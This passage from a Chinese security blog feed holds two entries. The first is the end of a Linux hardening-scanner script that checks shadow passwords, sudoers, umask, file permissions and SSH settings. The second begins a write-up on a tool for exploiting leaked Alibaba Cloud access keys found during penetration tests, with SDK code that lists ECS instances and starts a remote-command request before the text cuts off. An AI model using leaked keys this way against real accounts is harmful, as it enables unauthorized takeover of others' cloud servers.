class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[4] 空登录口令用户检查中...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  userlist=`awk -F: &#x27;length(<span class="variable">$2</span>)==0 &#123;print <span class="variable">$1</span>&#125;&#x27; /etc/shadow`</span></span><br><span class="line"><span class="string">  [ ! <span class="variable">$userlist</span> ] &amp;&amp; echo &quot;</span>[Y] 不存在空登录口令用户<span class="string">&quot;  &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  for i in <span class="variable">$userlist</span></span></span><br><span class="line"><span class="string">  do</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] <span class="variable">$i</span>登录密码为空，不符合要求，建议为该用户设置密码！<span class="string">&quot;  &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  done</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`具有sudo权限用户检查结果<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[5] sudo权限用户检查中...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  sudolist=`cat /etc/sudoers |grep -v &#x27;^#&#x27; |grep -v Defaults| grep -v &#x27;^$&#x27;`</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="variable">$sudolist</span><span class="string">&quot;  &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`用户缺省权限检查结果<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[6] 用户缺省权限检查中...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  umask1=`cat /etc/profile | grep umask | grep -v ^# | awk &#x27;&#123;print <span class="variable">$2</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  umask2=`cat /etc/csh.cshrc | grep umask | grep -v ^# | awk &#x27;&#123;print <span class="variable">$2</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  umask3=`cat /etc/bashrc | grep umask | grep -v ^# | awk &#x27;NR!=1&#123;print <span class="variable">$2</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  flags=0</span></span><br><span class="line"><span class="string">  for i in <span class="variable">$umask1</span></span></span><br><span class="line"><span class="string">  do</span></span><br><span class="line"><span class="string">    if [ <span class="variable">$i</span> != &quot;</span>027<span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">      echo &quot;</span>[N] /etc/profile文件中所所设置的<span class="built_in">umask</span>为<span class="variable">$&#123;i&#125;</span>,不符合要求，建议设置为027<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">      flags=1</span></span><br><span class="line"><span class="string">      break</span></span><br><span class="line"><span class="string">    fi</span></span><br><span class="line"><span class="string">  done</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$flags</span> == 0 ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] /etc/profile文件中所设置的<span class="built_in">umask</span>为<span class="variable">$&#123;i&#125;</span>,符合要求<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi </span></span><br><span class="line"><span class="string">  flags=0</span></span><br><span class="line"><span class="string">  for i in <span class="variable">$umask2</span></span></span><br><span class="line"><span class="string">  do</span></span><br><span class="line"><span class="string">    if [ <span class="variable">$i</span> != &quot;</span>027<span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">      echo &quot;</span>[N] /etc/csh.cshrc文件中所所设置的<span class="built_in">umask</span>为<span class="variable">$&#123;i&#125;</span>,不符合要求，建议设置为027<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">      flags=1</span></span><br><span class="line"><span class="string">      break</span></span><br><span class="line"><span class="string">    fi</span></span><br><span class="line"><span class="string">  done  </span></span><br><span class="line"><span class="string">  if [ <span class="variable">$flags</span> == 0 ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] /etc/csh.cshrc文件中所设置的<span class="built_in">umask</span>为<span class="variable">$&#123;i&#125;</span>,符合要求<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  flags=0</span></span><br><span class="line"><span class="string">  for i in <span class="variable">$umask3</span></span></span><br><span class="line"><span class="string">  do</span></span><br><span class="line"><span class="string">    if [ <span class="variable">$i</span> != &quot;</span>027<span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">      echo &quot;</span>[N] /etc/bashrc文件中所设置的<span class="built_in">umask</span>为<span class="variable">$&#123;i&#125;</span>,不符合要求，建议设置为027<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">      flags=1</span></span><br><span class="line"><span class="string">      break</span></span><br><span class="line"><span class="string">    fi</span></span><br><span class="line"><span class="string">  done</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$flags</span> == 0 ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] /etc/bashrc文件中所设置的<span class="built_in">umask</span>为<span class="variable">$&#123;i&#125;</span>,符合要求<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`系统关键目录权限检查结果<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[7] 系统关键目录权限检查中...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  file1=`ls -l /etc/passwd | awk &#x27;&#123;print <span class="variable">$1</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  file2=`ls -l /etc/shadow | awk &#x27;&#123;print <span class="variable">$1</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  file3=`ls -l /etc/group | awk &#x27;&#123;print <span class="variable">$1</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  file4=`ls -l /etc/securetty | awk &#x27;&#123;print <span class="variable">$1</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  file5=`ls -l /etc/services | awk &#x27;&#123;print <span class="variable">$1</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  #检测文件权限为400的文件</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$file2</span> = &quot;</span>-r--------<span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] /etc/shadow文件权限为400，符合要求<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] /etc/shadow文件权限不为400，不符合要求，建议设置权限为400<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  #检测文件权限为600的文件</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$file4</span> = &quot;</span>-rw-------<span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] /etc/security文件权限为600，符合要求<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] /etc/security文件权限不为600，不符合要求，建议设置权限为600<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  #检测文件权限为644的文件</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$file1</span> = &quot;</span>-rw-r--r--<span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] /etc/passwd文件权限为644，符合要求<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] /etc/passwd文件权限不为644，不符合要求，建议设置权限为644<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$file5</span> = &quot;</span>-rw-r--r--<span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] /etc/services文件权限为644，符合要求<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] /etc/services文件权限不为644，不符合要求，建议设置权限为644<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$file3</span> = &quot;</span>-rw-r--r--<span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] /etc/group文件权限为644，符合要求<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] /etc/group文件权限不为644，不符合要求，建议设置权限为644<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`SSH配置检查结果<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[8] ssh配置检查中...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  remoteLogin=<span class="subst">$(cat /etc/ssh/sshd_config | grep -v ^# |grep <span class="string">&quot;PermitRootLogin no&quot;</span>)</span></span></span><br><span class="line"><span class="string">  if [ $? -eq 0 ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] 已经设置root不能远程登陆，符合要求<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] 已经设置root能远程登陆，不符合要求，建议/etc/ssh/sshd_config添加PermitRootLogin no参数<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`ping服务检查结果<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[9] 系统ping服务检查中...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  pingd=`cat /proc/sys/net/ipv4/icmp_echo_ignore_all`</span></span><br><span class="line"><span class="string">  if [ &quot;</span><span class="variable">$pingd</span><span class="string">&quot; = &quot;</span>1<span class="string">&quot; ]; then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] 服务器已禁ping<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] 服务器未禁ping<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`telnet服务检查结果<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[10] 系统telnet服务检查中...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  telnetd=`rpm -qa|grep telnet | wc -l`</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$telnetd</span> = &quot;</span>0<span class="string">&quot; ]; then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] 系统未安装telnet服务 <span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">  echo &quot;</span>[N] 检测到安装了telnet服务，不符合要求，建议禁用telnet服务<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`远程连接的安全性配置检查结果<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[11] 远程连接的安全性配置检查中...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  fileNetrc=`find / -xdev -mount -name .netrc -print 2&gt; /dev/null`</span></span><br><span class="line"><span class="string">  if [  -z &quot;</span><span class="variable">$&#123;fileNetrc&#125;</span><span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] 不存在.netrc文件，符合要求<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] 存在.netrc文件，不符合要求<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  fileRhosts=`find / -xdev -mount -name .rhosts -print 2&gt; /dev/null`</span></span><br><span class="line"><span class="string">  if [ -z &quot;</span><span class="variable">$fileRhosts</span><span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] 不存在.rhosts文件，符合要求<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] 存在.rhosts文件，不符合要求<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`异常隐含文件检查结果<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[12] 异常隐含文件检查中...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  hideFile=<span class="subst">$(find / -xdev -mount \( -name <span class="string">&quot;..*&quot;</span> -o -name <span class="string">&quot;...*&quot;</span> \) 2&gt; /dev/null)</span></span></span><br><span class="line"><span class="string">  if [  -z &quot;</span><span class="variable">$&#123;hideFile&#125;</span><span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] 不存在隐藏文件，符合要求<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] 存在隐藏文件，建议仔细检查：<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  for i in <span class="variable">$&#123;hideFile&#125;</span></span></span><br><span class="line"><span class="string">  do</span></span><br><span class="line"><span class="string">   echo <span class="variable">$i</span> &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  done</span></span><br><span class="line"><span class="string">  fi  </span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`syslog登录事件检查结果<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[13] syslog登录事件检查中...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  if [  -f &quot;</span>/etc/syslog.conf<span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">    logFile=<span class="subst">$(cat /etc/syslog.conf | grep -V ^# | grep authpriv.*)</span></span></span><br><span class="line"><span class="string">    if [ ! -z &quot;</span><span class="variable">$&#123;logFile&#125;</span><span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">      echo &quot;</span>[Y] 存在保存authpirv的日志文件<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">    else</span></span><br><span class="line"><span class="string">      echo &quot;</span>[N] 不存在保存authpirv的日志文件<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">    fi</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] 不存在／etc/syslog.conf文件，建议对所有登录事件都记录<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi  </span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`日志审核功能检查结果<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[14] 日志审核功能检查中...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  auditdStatus=<span class="subst">$(service auditd status 2&gt; /dev/null)</span></span></span><br><span class="line"><span class="string">  if [ $? = 0 ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] 系统日志审核功能已开启，符合要求<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  if [ $? = 3 ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] 系统日志审核功能已关闭，不符合要求，建议service auditd start开启<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`系统core dump状态检查结果<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[15] 系统core dump状态检查中...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  limitsFile=<span class="subst">$(cat /etc/security/limits.conf | grep -V ^# | grep core)</span></span></span><br><span class="line"><span class="string">  if [ $? -eq 0 ];then</span></span><br><span class="line"><span class="string">    soft=`cat /etc/security/limits.conf | grep -V ^# | grep core | awk &#123;print <span class="variable">$2</span>&#125;`</span></span><br><span class="line"><span class="string">    for i in <span class="variable">$soft</span></span></span><br><span class="line"><span class="string">    do</span></span><br><span class="line"><span class="string">      if [ &quot;</span><span class="variable">$i</span><span class="string">&quot;x = &quot;</span>soft<span class="string">&quot;x ];then</span></span><br><span class="line"><span class="string">        echo &quot;</span>[Y] * soft core 0 已经设置<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">      fi</span></span><br><span class="line"><span class="string">      if [ &quot;</span><span class="variable">$i</span><span class="string">&quot;x = &quot;</span>hard<span class="string">&quot;x ];then</span></span><br><span class="line"><span class="string">        echo &quot;</span>[Y] * hard core 0 已经设置<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">      fi</span></span><br><span class="line"><span class="string">    done</span></span><br><span class="line"><span class="string">  else </span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] 没有设置core，建议在/etc/security/limits.conf中添加* soft core 0和* hard core 0<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">  cat  <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">  echo -e &quot;</span>\033[36m输出结果<span class="string">&quot;<span class="variable">$scanner_log</span>&quot;</span> \033[0m<span class="string">&quot;</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">bk_safe</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里云主机accesskey利用工具</title>
      <link href="2020/12/21/%E9%98%BF%E9%87%8C%E4%BA%91%E4%B8%BB%E6%9C%BAaccesskey%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
      <url>2020/12/21/%E9%98%BF%E9%87%8C%E4%BA%91%E4%B8%BB%E6%9C%BAaccesskey%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="简介（Gamma实验室第二个开源工具）"><a href="#简介（Gamma实验室第二个开源工具）" class="headerlink" title="简介（Gamma实验室第二个开源工具）"></a>简介（Gamma实验室第二个开源工具）</h1><p>在日常渗透过程中我们经常遇到信息泄露出ALIYUN_ACCESSKEYID与ALIYUN_ACCESSKEYSECRET（阿里云API key），特别是laravel框架得debug信息。APP中也会泄露这些信息。</p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>我们说下阿里API有什么用吧，以下是官方说明：</p><p>云服务器（Elastic Compute Service，ECS），可以调用API管理您的云上资源和开发自己的应用程序。<br>ECS API支持HTTP或者HTTPS网络请求协议，允许GET和POST方法。您可以通过以下方式调用ECS API<br>详情参考阿里云官方API文档：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;help.aliyun.com&#x2F;document_detail&#x2F;25484.html?spm&#x3D;a2c4g.11186623.6.1276.12244f88jytZ8c</span><br></pre></td></tr></table></figure><h1 id="开发思路"><a href="#开发思路" class="headerlink" title="开发思路"></a>开发思路</h1><h3 id="1、通过阿里云SDK使用"><a href="#1、通过阿里云SDK使用" class="headerlink" title="1、通过阿里云SDK使用"></a>1、通过阿里云SDK使用</h3><p>SDK下载地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;aliyun&#x2F;aliyun-openapi-python-sdk</span><br></pre></td></tr></table></figure><p>pip安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Install the core library</span><br><span class="line">pip install aliyun-python-sdk-core</span><br><span class="line"> # Install the ECS management library</span><br><span class="line">pip install aliyun-python-sdk-ecs</span><br><span class="line"> # Install the RDS management library</span><br><span class="line">pip install aliyun-python-sdk-rds</span><br></pre></td></tr></table></figure><p>调用查询ecs主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">#coding&#x3D;utf-8</span><br><span class="line">from aliyunsdkcore.client import AcsClient</span><br><span class="line">from aliyunsdkcore.acs_exception.exceptions import ClientException</span><br><span class="line">from aliyunsdkcore.acs_exception.exceptions import ServerException</span><br><span class="line">from aliyunsdkecs.request.v20140526.DescribeInstancesRequest import DescribeInstancesRequest</span><br><span class="line">client &#x3D; AcsClient(&#39;&lt;accessKeyId&gt;&#39;, &#39;&lt;accessSecret&gt;&#39;, &#39;cn-hangzhou&#39;)</span><br><span class="line">request &#x3D; DescribeInstancesRequest()</span><br><span class="line">request.set_accept_format(&#39;json&#39;)</span><br><span class="line">response &#x3D; client.do_action_with_exception(request)</span><br><span class="line"># python2:  print(response) </span><br><span class="line">print(str(response, encoding&#x3D;&#39;utf-8&#39;))</span><br></pre></td></tr></table></figure><p>创建命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">#coding&#x3D;utf-8</span><br><span class="line">from aliyunsdkcore.client import AcsClient</span><br><span class="line">from aliyunsdkcore.acs_exception.exceptions import ClientException</span><br><span class="line">from aliyunsdkcore.acs_exception.exceptions import ServerException</span><br><span class="line">from aliyunsdkecs.request.v20140526.CreateCommandRequest import 